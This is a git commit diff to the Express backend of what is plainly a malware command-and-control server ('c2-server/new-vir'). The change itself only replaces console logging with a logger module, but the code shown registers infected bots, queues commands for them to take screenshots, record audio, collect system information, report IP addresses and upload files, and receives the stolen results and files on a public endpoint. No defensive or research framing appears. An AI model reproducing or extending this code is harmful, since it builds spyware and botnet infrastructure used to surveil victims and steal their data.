0e33ebaf3512fc1bae4ffe3b58cc9af56070caaa
thegostisdead <thegostisdead@gmail.com>
2024-01-31 12:06:07 +0100

    feat: add better logger

--- c2-server/new-vir/backend/app.js
+++ c2-server/new-vir/backend/app.js
@@ -1,6 +1,8 @@
 const express = require("express");
 const multer = require("multer");
+const logger = require("./logger");
 const {Channel} = require("./channel");
+
 const {Idle, UploadFile, Ping, Announce, Screenshot, GetSysInfo, GetPublicIp, GetPrivateIp, AudioCapture} = require("./commands")
 
 const storage = multer.diskStorage({
@@ -8,13 +10,13 @@ const storage = multer.diskStorage({
         cb(null, 'uploads/');
     },
     filename: (req, file, cb) => {
-        console.log(JSON.stringify(req.body))
+        logger.info(JSON.stringify(req.body))
 
         // notify for file received in the correct channel
         const currentChannel = channels.find((channel) => channel.botId === req.body.botId)
 
         if (!currentChannel) {
-            console.log("No channel found for the req.")
+            logger.info("No channel found for the req.")
             cb(null, null)
         }
 
@@ -49,62 +51,62 @@ const bots = []; // { id: 1, name: "Bot 1", status: "online" },
 const channels = []; 
 
 function createChannel(botId) {
-    console.log("creating channel for bot : " + botId);
+    logger.info("creating channel for bot : " + botId);
     const channel = new Channel(botId);
     channels.push(channel);
     return channel;
 }
 
 function registerBot(bot) {
-    console.log("registering bot : " + bot.name);
+    logger.info("registering bot : " + bot.name);
     createChannel(bot.id);
     bots.push(bot)
 }
 
 function sendCommand(command) {
-    console.log("sending command : " + command.name + "to : " + command.botId);
+    logger.info("sending command : " + command.name + "to : " + command.botId);
     const targetChannel = channels.find((channel) => channel.botId === command.botId)
 
     switch (command.name) {
 
         case "Ping" :
-            console.log("Adding ping command -> " + command.args.targetIp)
+            logger.info("Adding ping command -> " + command.args.targetIp)
             const pingCommand = new Ping(command.args.targetIp)
             targetChannel.commands.push(pingCommand)
             break
 
         case "Screenshot":
-            console.log("Adding Screenshot command")
+            logger.info("Adding Screenshot command")
             const screenshotCommand = new Screenshot()
             targetChannel.commands.push(screenshotCommand)
             break
 
         case "AudioCapture":
-            console.log("Audio capture command")
+            logger.info("Audio capture command")
             const audioCaptureCommand = new AudioCapture({length : command.args.length, path: command.args.path})
             targetChannel.commands.push(audioCaptureCommand)
             break
 
         case "GetSysInfo":
-            console.log("Adding GetSysInfo command")
+            logger.info("Adding GetSysInfo command")
             const sysInfoCommand = new GetSysInfo()
             targetChannel.commands.push(sysInfoCommand)
             break
 
         case "UploadFile":
-            console.log("Adding UploadFile command")
+            logger.info("Adding UploadFile command")
             const uploadCommand = new UploadFile({path: command.args.path})
             targetChannel.commands.push(uploadCommand)
             break
 
         case "GetPublicIp":
-            console.log("Adding GetPublicIp command")
+            logger.info("Adding GetPublicIp command")
             const publicCommand = new GetPublicIp()
             targetChannel.commands.push(publicCommand)
             break
 
         case "GetPrivateIp":
-            console.log("Adding GetPrivateIp command")
+            logger.info("Adding GetPrivateIp command")
             const privateCommand = new GetPrivateIp()
             targetChannel.commands.push(privateCommand)
             break
@@ -132,19 +134,19 @@ function getCommands(botId) {
 
     if (commands.length >= 1) {
         command = commands.at(0)
-        console.log(`Command picked : ${command}`)
+        logger.info(`Command picked : ${command}`)
         return JSON.stringify(command)
     }
 
     const idleCommand = new Idle()
-    console.log(idleCommand)
+    logger.info(idleCommand)
     return JSON.stringify(idleCommand)
 }
 
 function addChannelMessage(botId, message) {
     const targetChannel = channels.find((channel) => channel.botId === botId)
     if (targetChannel) {
-        console.log("Adding message to channel.")
+        logger.info("Adding message to channel.")
         targetChannel.messages.push(message)
     }
 
@@ -158,10 +160,10 @@ app.get("/backend/bots", (req, res) => {
 
 app.post("/backend/commands", (req, res) => {
     const payload = req.body;
-    console.log("receiving a POST request from : " + req.ip);
+    logger.info("receiving a POST request from : " + req.ip);
 
     sendCommand({  botId: payload.botId, name: payload.name, args: payload.args });
-    console.log("sending command to bot : " + payload.botId);
+    logger.info("sending command to bot : " + payload.botId);
     res.send("OK");
 
 });
@@ -187,13 +189,13 @@ app.get("/backend/channels", (req, res) => {
 
 /* --- PUBLIC --- */ 
 app.post("/",  upload.single('file'), (req, res) => {
-    console.log("receiving a POST request from : " + req.ip);
-    console.log("request body : " + JSON.stringify(req.body));
+    logger.info("receiving a POST request from : " + req.ip);
+    logger.info("request body : " + JSON.stringify(req.body));
 
     const payload = req.body;
 
     if (req.body.uploadType) {
-        console.log("Received file.")
+        logger.info("Received file.")
         res.send("OK");
         return;
     }
@@ -205,22 +207,22 @@ app.post("/",  upload.single('file'), (req, res) => {
     }
 
     else if (payload.name === "GET_COMMANDS") {
-        console.log("sending commands to bot : " + payload.id);
+        logger.info("sending commands to bot : " + payload.id);
         const command = getCommands(payload.id)
-        console.log(command)
+        logger.info(command)
         res.send(command);
         return;
     }
     else if (payload.name === "COMMAND_RESULT") {
-        console.log("command result from bot : " + payload.id);
-        console.log("command result : " + payload.result);
-        console.log(payload.result)
+        logger.info("command result from bot : " + payload.id);
+        logger.info("command result : " + payload.result);
+        logger.info(payload.result)
 
         popCommand(payload.id)
         addChannelMessage(payload.id, payload.result)
 
     } else {
-        console.log("unknown request");
+        logger.warn("unknown request");
     }
 
     res.send("OK");
